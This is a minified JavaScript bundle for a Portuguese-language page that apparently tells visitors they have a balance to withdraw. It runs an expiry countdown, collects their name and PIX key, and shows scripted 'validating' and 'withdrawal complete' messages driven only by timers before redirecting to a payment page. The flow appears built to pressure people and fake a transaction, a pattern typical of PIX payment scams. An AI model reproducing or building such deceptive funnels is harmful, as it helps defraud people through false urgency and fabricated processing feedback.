import{p as R}from"./pix-preloader-DwpR4EFv.js";(function(){let E=null,m=null;function f(e){const t=document.getElementById(e);if(!t)return;if(m=e,t.classList.add("is-modal","is-active"),t.removeAttribute("aria-hidden"),!document.body.classList.contains("modal-open")){const r=window.scrollY;document.body.style.position="fixed",document.body.style.top=`-${r}px`,document.body.style.width="100%",document.body.classList.add("modal-open"),document.documentElement.classList.add("modal-open")}if(e==="two"){const r=document.querySelector("#one .container-saldo .btn-sacar");r&&(r.removeAttribute("disabled"),r.style.pointerEvents="auto",r.style.opacity=""),setTimeout(()=>{const s=t.querySelector(".valor-currency[data-amount-target]");s&&typeof window.animateCurrencyCounter=="function"&&(s.textContent="R$ 0,00",window.animateCurrencyCounter(s,!0))},50)}function n(r){}t.addEventListener("click",n),t._overlayHandler=n;const o=Array.from(t.querySelectorAll("[data-modal-close]"));t._closeButtonHandlers=o.map(r=>{const s=i=>{i&&i.preventDefault(),u(e)};return r.addEventListener("click",s),{btn:r,h:s}});const a=t.querySelector('button, a, input, [tabindex]:not([tabindex="-1"])');a&&a.focus()}function u(e){const t=document.getElementById(e);if(!t)return;if(t._overlayHandler&&t.removeEventListener("click",t._overlayHandler),t._closeButtonHandlers&&t._closeButtonHandlers.forEach(({btn:a,h:r})=>a.removeEventListener("click",r)),t.classList.remove("is-active","is-modal"),t.setAttribute("aria-hidden","true"),document.querySelectorAll(".screen.is-modal.is-active").length===0){const a=document.body.style.top;document.body.style.position="",document.body.style.top="",document.body.style.width="",window.scrollTo(0,parseInt(a||"0")*-1),document.body.classList.remove("modal-open"),document.documentElement.classList.remove("modal-open")}m=null;const o=document.getElementById("one");if(o){const a=o.querySelector('button, a, input, [tabindex]:not([tabindex="-1"])');a&&a.focus()}}function l(){p(),E=setTimeout(()=>{const e=document.getElementById("one");e&&e.classList.contains("is-active")&&f("two")},0)}function p(){E&&(clearTimeout(E),E=null)}window.addEventListener("beforeunload",p);function y(e){const t=document.getElementById("timer"),n=document.getElementById("countdown-text");if(!t||!n)return;let o=e,a=setInterval(()=>{if(o<0){clearInterval(a),n.textContent="SEU SALDO EXPIROU";return}let r=Math.floor(o/60),s=o%60;t.textContent=`00 - ${String(r).padStart(2,"0")} - ${String(s).padStart(2,"0")}`,o--},1e3)}function x(e){const t=document.querySelectorAll(".expira-em-popup");t.length&&t.forEach((n,o)=>{const a=n.querySelector('[data-timer="minutes"]'),r=n.querySelector('[data-timer="seconds"]'),s=n.querySelector(".timer-label");if(!a||!r||!s)return;let i=e,c=setInterval(()=>{if(i<0){clearInterval(c),s.textContent="Expirado",a.textContent="00",r.textContent="00";return}let w=Math.floor(i/60),h=i%60;a.textContent=String(w).padStart(2,"0"),r.textContent=String(h).padStart(2,"0"),i--},1e3)})}let d={timeouts:[],interval:null};function I(){const e=document.getElementById("loading-text"),t=document.getElementById("progress-bar");!e||!t||(d.timeouts.forEach(n=>clearTimeout(n)),d.timeouts=[],d.interval&&(clearInterval(d.interval),d.interval=null),t.style.transition="none",t.style.width="0%",e.textContent="Iniciando...",e.style.opacity="1")}function C(){const e=document.getElementById("loading-text"),t=document.getElementById("progress-bar");if(!e||!t)return;I();const n=[{text:"Validando suas informações",progress:25},{text:"Concluindo saque",progress:50},{text:"Processando transação",progress:75},{text:"Finalizando",progress:100}],o=3e3,a=400,r=800;let s=0;t.offsetWidth,t.style.transition=`width ${o/1e3}s linear`;function i(){if(s<n.length){d.interval&&clearInterval(d.interval),e.style.opacity=0;const w=setTimeout(()=>{const h=n[s],L=h.text;e.textContent=L;const b=t.parentElement.offsetWidth-40;t.style.width=b*h.progress/100+"px",e.style.opacity=1;let v=0;d.interval=setInterval(()=>{v=v%3+1,e.textContent=L+".".repeat(v)},r),s++;const M=setTimeout(i,o);d.timeouts.push(M)},a);d.timeouts.push(w)}else{d.interval&&clearInterval(d.interval),e.style.opacity=0;const w=setTimeout(()=>{e.textContent="Saque Concluído!",e.style.opacity=1},a);d.timeouts.push(w)}}const c=setTimeout(i,500);d.timeouts.push(c)}window.startLoader=C,window.resetLoader=I;let g={interval:null,timeouts:[]};function S(){const e=document.getElementById("new-loading-text"),t=document.getElementById("new-progress-bar");if(!e||!t)return;_(),t.style.transition="width 1.3s ease-in-out";const n=["Validando dados...","Conectando ao servidor...","Concluindo resgate...","Quase pronto..."];e.textContent=n[0];let o=0;const a=n.length,r=100/a;function s(){const c=(o+1)*r;t.style.width=`${c}%`}s();function i(){e.style.opacity=0;const c=setTimeout(()=>{o++,e.textContent=n[o],e.style.opacity=1,s()},150);g.timeouts.push(c)}g.interval=setInterval(()=>{if(o>=a-1){clearInterval(g.interval);const c=setTimeout(()=>{typeof window.showScreen=="function"?window.showScreen("nine"):location.hash="#nine"},700);g.timeouts.push(c);return}i()},1600)}function _(){const e=document.getElementById("new-loading-text"),t=document.getElementById("new-progress-bar");g.interval&&(clearInterval(g.interval),g.interval=null),g.timeouts.forEach(n=>clearTimeout(n)),g.timeouts=[],e&&(e.textContent="Validando acesso...",e.style.opacity=1),t&&(t.style.transition="none",t.style.width="0%",t.offsetWidth,t.style.transition="width 1.2s cubic-bezier(0.25, 0.46, 0.45, 0.94)")}window.startNewLoadingAnimation=S,window.resetNewLoadingAnimation=_;function k(){let e=window.__formData;if(!e)try{const s=localStorage.getItem("userPixData");s&&(e=JSON.parse(s))}catch(s){console.error("Erro ao ler localStorage",s)}if(!e)return;function t(){const s=new Date,i=String(s.getDate()).padStart(2,"0"),c=String(s.getMonth()+1).padStart(2,"0"),w=s.getFullYear();return`${i}/${c}/${w}`}const n=document.getElementById("confirmation-name");n&&e.nome&&(n.textContent=e.nome);const o=document.getElementById("confirmation-date");o&&(o.textContent=t());const a=document.getElementById("confirmation-key-type");a&&e.tipoChave&&(a.textContent=e.tipoChave);const r=document.getElementById("confirmation-pix-key");if(r&&e.chavePix){let s=e.chavePix;if(e.tipoChave==="CPF"){if(!s.includes(".")&&!s.includes("-")){const i=s.replace(/\D/g,"");i.length===11&&(s=i.replace(/(\d{3})(\d)/,"$1.$2").replace(/(\d{3})(\d)/,"$1.$2").replace(/(\d{3})(\d{1,2})$/,"$1-$2"))}}else if(e.tipoChave==="Celular"){const i=s.replace(/\D/g,"");i.length>=10&&i.length<=11&&!s.includes("(")&&(i.length===11?s=i.replace(/(\d{2})(\d{5})(\d{4})/,"($1) $2-$3"):i.length===10&&(s=i.replace(/(\d{2})(\d{4})(\d{4})/,"($1) $2-$3")))}r.textContent=s}}window.fillConfirmationPage=k;function F(){const e=Array.from(document.querySelectorAll("#screens .screen"));if(!e.length)return;function t(o,a=!0){const r=document.getElementById(o);if(!r){console.warn(`Tela "${o}" não encontrada.`);return}if(e.forEach(i=>{i===r?(i.classList.add("is-active"),i.removeAttribute("aria-hidden")):(i.classList.remove("is-active"),i.setAttribute("aria-hidden","true"))}),a)try{history.pushState({screen:o},"","#"+o)}catch{location.hash=o}window.scrollTo(0,0),document.documentElement.scrollTop=0,document.body.scrollTop=0,o==="nine"&&(window.scrollTo({top:0,left:0,behavior:"instant"}),document.documentElement.scrollTop=0,document.body.scrollTop=0,setTimeout(()=>{window.scrollTo({top:0,left:0,behavior:"instant"}),document.documentElement.scrollTop=0,document.body.scrollTop=0;const i=document.getElementById("nine");if(i){i.scrollTop=0;const c=i.querySelector(".confirmation-container");c&&(c.scrollTop=0)}},100));const s=r.querySelector('button, a, input, select, textarea, [tabindex]:not([tabindex="-1"])');if(s&&s.focus({preventScroll:!0}),o==="one")l();else{p();const i=document.getElementById("popup-um");i&&i.classList.remove("is-visible"),o==="seven"?(["two","four","five","six"].forEach(w=>{const h=document.getElementById(w);h&&h.classList.contains("is-modal")&&u(w)}),typeof S=="function"&&S()):(typeof window.resetLoader=="function"&&window.resetLoader(),typeof _=="function"&&_(),m&&u(m))}o==="three"&&typeof window.animateCurrencyCounter=="function"&&(r._threeAnimationTimeout&&clearTimeout(r._threeAnimationTimeout),r._threeAnimationTimeout=setTimeout(()=>{const i=r.querySelector(".valor-currency[data-amount-target]");i&&r.classList.contains("is-active")&&window.animateCurrencyCounter(i,!0),r._threeAnimationTimeout=null},100)),o==="nine"&&(window.scrollTo(0,0),document.documentElement.scrollTop=0,document.body.scrollTop=0,k(),setTimeout(()=>{window.scrollTo(0,0),document.documentElement.scrollTop=0,document.body.scrollTop=0;const i=document.getElementById("nine");i&&(i.scrollTop=0);const c=document.querySelector(".confirmation-balance-amount[data-amount-target]");c&&typeof window.animateCurrencyCounter=="function"&&window.animateCurrencyCounter(c,!0)},150))}window.addEventListener("popstate",o=>{const a=o.state&&o.state.screen||location.hash.replace("#","")||e[0].id;t(a,!1)});const n=location.hash.replace("#","")||e[0].id;t(n,!1),window.showScreen=t}document.addEventListener("DOMContentLoaded",()=>{const e=document.querySelector("#one .container-saldo .btn-sacar")||document.querySelector(".btn-sacar");e&&e.addEventListener("click",function(t){t.preventDefault(),typeof p=="function"&&p(),typeof u=="function"&&m&&u(m),typeof window.showScreen=="function"?window.showScreen("three"):location.hash="#three"})}),document.addEventListener("DOMContentLoaded",()=>{F();const e=16*60+38;y(e),x(e),O(),(location.hash.replace("#","")||"one")==="one"&&l()});function O(){const e=document.querySelector("#one .saldo"),t=document.getElementById("popup-um"),n=document.getElementById("one");if(!e||!t||!n)return;const o=t.querySelector(".btn-sacar");o&&o.addEventListener("click",r=>{r.preventDefault(),typeof window.showScreen=="function"?window.showScreen("three"):location.hash="#three"});const a=new IntersectionObserver(r=>{r.forEach(s=>{!s.isIntersecting&&n.classList.contains("is-active")?t.classList.add("is-visible"):t.classList.remove("is-visible")})},{threshold:0,rootMargin:"-50px 0px 0px 0px"});a.observe(e),window.__stickyObserver=a}window.__spa_modal_helpers={schedulePopupForOne:l,clearModalTimer:p,showModal:f,closeModal:u},document.body.addEventListener("click",function(e){const t=e.target.closest("[data-modal-close]");if(!t)return;e.preventDefault();const n=t.closest(".screen"),o=n?n.id:"two";if(typeof u=="function")u(o);else if(window.__spa_modal_helpers&&typeof window.__spa_modal_helpers.closeModal=="function")window.__spa_modal_helpers.closeModal(o);else{const a=document.getElementById(o);a&&(a.classList.remove("is-active","is-modal"),a.setAttribute("aria-hidden","true"),document.body.classList.remove("modal-open"))}}),document.body.addEventListener("click",function(e){const t=e.target.closest("[data-open-modal]");if(!t)return;const n=t.getAttribute("data-open-modal");if(n){if(e.preventDefault(),e.stopPropagation(),n==="six"){const o=document.getElementById("pix-selector-text");if(o){const a=o.textContent.trim(),s={CPF:"key-cpf","E-mail":"key-email",Celular:"key-celular","Chave Aleatória":"key-aleatoria"}[a];if(s){const i=document.getElementById(s);i&&(i.checked=!0)}}}typeof f=="function"?f(n):window.__spa_modal_helpers&&typeof window.__spa_modal_helpers.showModal=="function"&&window.__spa_modal_helpers.showModal(n)}}),document.body.addEventListener("keydown",function(e){if(e.key!=="Enter"&&e.key!==" ")return;const t=e.target.closest("[data-open-modal]");if(!t)return;const n=t.getAttribute("data-open-modal");n&&(e.preventDefault(),e.stopPropagation(),typeof f=="function"?f(n):window.__spa_modal_helpers&&typeof window.__spa_modal_helpers.showModal=="function"&&window.__spa_modal_helpers.showModal(n))});function B(e){if(e=e.replace(/[^\d]+/g,""),e.length!==11||/^(\d)\1+$/.test(e))return!1;let t=0,n;for(let o=1;o<=9;o++)t+=parseInt(e.substring(o-1,o))*(11-o);if(n=t*10%11,(n===10||n===11)&&(n=0),n!==parseInt(e.substring(9,10)))return!1;t=0;for(let o=1;o<=10;o++)t+=parseInt(e.substring(o-1,o))*(12-o);return n=t*10%11,(n===10||n===11)&&(n=0),n===parseInt(e.substring(10,11))}function A(e){return/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(e)}function $(e){const t=e.replace(/\D/g,"");return t.length>=10&&t.length<=11}function P(e){return/^[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}$/.test(e)}function T(){const e=document.getElementById("nome"),t=document.getElementById("pix-key-input"),n=document.getElementById("pix-selector-text"),o=document.getElementById("btn-enviar-pix");if(!e||!t||!n||!o)return;const a=e.value.trim().length>0,r=n.textContent.trim(),s=r!=="Escolha o tipo de chave PIX",i=t.value.trim();let c=!1;if(s&&i.length>0)switch(r){case"CPF":c=B(i);break;case"E-mail":c=A(i);break;case"Celular":c=$(i);break;case"Chave Aleatória":c=P(i);break;default:c=i.length>0}a&&s&&c?o.classList.remove("btn-disabled"):o.classList.add("btn-disabled")}const q=document.getElementById("nome");q&&q.addEventListener("input",T),document.body.addEventListener("click",function(e){const t=e.target.closest("#six .option-row");if(!t)return;e.preventDefault(),e.stopPropagation();const n=t.querySelector(".option-text"),o=n?n.textContent.trim():"Chave",a=document.getElementById("pix-selector-text");a&&(a.textContent=o,a.style.color="#000");const r=document.getElementById("pix-key-input"),s=document.getElementById("pix-key-wrapper");r&&(r.value="",r.removeAttribute("disabled"),r.classList.remove("input-disabled"),r.focus()),s&&s.classList.remove("input-wrapper-disabled");const i=document.getElementById("pix-type-selector");i&&i.classList.remove("input-error","shake-animation"),T(),typeof u=="function"?u("six"):window.__spa_modal_helpers&&typeof window.__spa_modal_helpers.closeModal=="function"&&window.__spa_modal_helpers.closeModal("six")}),document.body.addEventListener("click",function(e){const t=e.target.closest("#pix-key-wrapper");if(t&&t.classList.contains("input-wrapper-disabled")){const n=document.getElementById("pix-type-selector");n&&(n.classList.remove("shake-animation","input-error"),n.offsetWidth,n.classList.add("input-error","shake-animation"),setTimeout(()=>{n.classList.remove("shake-animation")},500))}}),document.body.addEventListener("click",async function(e){const t=e.target.closest("#btn-enviar-pix");if(!t)return;if(e.preventDefault(),t.classList.contains("btn-disabled")){const i=document.getElementById("nome"),c=document.getElementById("pix-type-selector"),w=document.getElementById("pix-selector-text"),h=document.getElementById("pix-key-input");i&&i.value.trim()===""&&(i.classList.remove("shake-animation","input-error"),i.offsetWidth,i.classList.add("input-error","shake-animation"),setTimeout(()=>i.classList.remove("shake-animation"),500));const L=w&&w.textContent.trim()!=="Escolha o tipo de chave PIX";if(!L&&c&&(c.classList.remove("shake-animation","input-error"),c.offsetWidth,c.classList.add("input-error","shake-animation"),setTimeout(()=>c.classList.remove("shake-animation"),500)),L&&h){const b=h.value.trim();let v=!1;switch(w.textContent.trim()){case"CPF":v=B(b);break;case"E-mail":v=A(b);break;case"Celular":v=$(b);break;case"Chave Aleatória":v=P(b);break;default:v=b.length>0}v||(h.classList.remove("shake-animation","input-error"),h.offsetWidth,h.classList.add("input-error","shake-animation"),h.focus(),setTimeout(()=>h.classList.remove("shake-animation"),500))}return}const n=document.getElementById("nome"),o=document.getElementById("pix-selector-text"),a=document.getElementById("pix-key-input"),r={nome:n?n.value.trim():"",tipoChave:o?o.textContent.trim():"",chavePix:a?a.value.trim():""};window.__formData=r;try{localStorage.setItem("userPixData",JSON.stringify(r))}catch(i){console.error("Erro ao salvar no localStorage",i)}showScreen("seven");const s=document.getElementById("new-loading-text");s&&(s.textContent="Gerando código PIX...");try{await R(),window.location.href="pagamento.html"}catch(i){console.error("Erro ao pré-carregar PIX:",i),window.location.href="pagamento.html"}});function N(e,t){if(!e)return"";if(t==="CPF")return e=e.replace(/\D/g,""),e.length>11&&(e=e.slice(0,11)),e.replace(/(\d{3})(\d)/,"$1.$2").replace(/(\d{3})(\d)/,"$1.$2").replace(/(\d{3})(\d{1,2})$/,"$1-$2");if(t==="Celular")return e=e.replace(/\D/g,""),e.length>11&&(e=e.slice(0,11)),e.length>10?e.replace(/^(\d\d)(\d{5})(\d{4}).*/,"($1) $2-$3"):e.length>6?e.replace(/^(\d\d)(\d{4})(\d{0,4}).*/,"($1) $2-$3"):e.length>2?e.replace(/^(\d\d)(\d{0,5})/,"($1) $2"):e.replace(/^(\d*)/,"($1");if(t==="Chave Aleatória"){e=e.replace(/[^0-9a-fA-F]/g,""),e.length>32&&(e=e.slice(0,32));let n="";return e.length>0&&(n+=e.slice(0,8)),e.length>8&&(n+="-"+e.slice(8,12)),e.length>12&&(n+="-"+e.slice(12,16)),e.length>16&&(n+="-"+e.slice(16,20)),e.length>20&&(n+="-"+e.slice(20,32)),n}return e}const D=document.getElementById("pix-key-input");D&&D.addEventListener("input",function(e){const t=document.getElementById("pix-selector-text");if(!t)return;const n=t.textContent.trim(),o=N(this.value,n);this.value!==o&&(this.value=o),T()})})();(function(){function E(){const f=document.querySelector("#three .botoes-row-sacar")||document.querySelector(".botoes-row-sacar");if(!f)return;const u=Array.from(f.querySelectorAll('button, [role="button"], a')),l=document.querySelector(".display-total");l&&u.push(l);const p="btn-active",y=document.querySelector(".btn-sacar-dois");y&&y.addEventListener("click",()=>{y.classList.contains("btn-sacar-indisponivel")||(typeof window.__spa_modal_helpers.showModal=="function"?window.__spa_modal_helpers.showModal("four"):showModal("four"))});function x(){u.forEach(d=>d.classList.remove(p))}u.forEach(d=>{d.addEventListener("click",()=>{x(),d.classList.add(p),y&&(y.classList.remove("btn-sacar-indisponivel"),y.removeAttribute("disabled"),y.style.pointerEvents="auto",y.style.opacity="1")})}),x()}function m(){E()}if(window.showScreen&&typeof window.showScreen=="function"){const f=window.showScreen;window.showScreen=function(u,l){f(u,l),String(u)==="three"&&setTimeout(m,30)}}else document.addEventListener("DOMContentLoaded",()=>{location.hash.replace("#","")==="three"&&setTimeout(m,30)});window.__spa_helpers=window.__spa_helpers||{},window.__spa_helpers.onShowThree=m})();(function(){const E="#three .valor-currency-dois[data-amount-target]";function m(l){return l.toLocaleString("pt-BR",{style:"currency",currency:"BRL"})}function f(l,p,y=1400){if(!l)return;const x=0,d=performance.now();function I(C){const g=Math.min(1,(C-d)/y),S=1-(1-g)*(1-g),_=x+(p-x)*S;l.textContent=m(_),g<1?requestAnimationFrame(I):l.textContent=m(p)}requestAnimationFrame(I)}function u(){const l=document.querySelector(E);if(!l)return;const p=l.getAttribute("data-amount-target"),y=parseFloat(p);isNaN(y)||(l.textContent=m(0),setTimeout(()=>f(l,y,1400),20))}document.addEventListener("DOMContentLoaded",()=>{const l=document.getElementById("three");l&&l.classList.contains("is-active")&&setTimeout(u,20)}),window.__countup=window.__countup||{},window.__countup.trigger=function(l){if(l){const p=document.querySelector(E);p&&(p.textContent=m(0))}u()}})();document.addEventListener("DOMContentLoaded",function(){setTimeout(()=>{if(window.showScreen){const E=window.showScreen;window.showScreen=function(m,f){E(m,f),m==="three"&&setTimeout(()=>{window.__spa_helpers&&window.__spa_helpers.onShowThree&&window.__spa_helpers.onShowThree()},30)}}},100)});
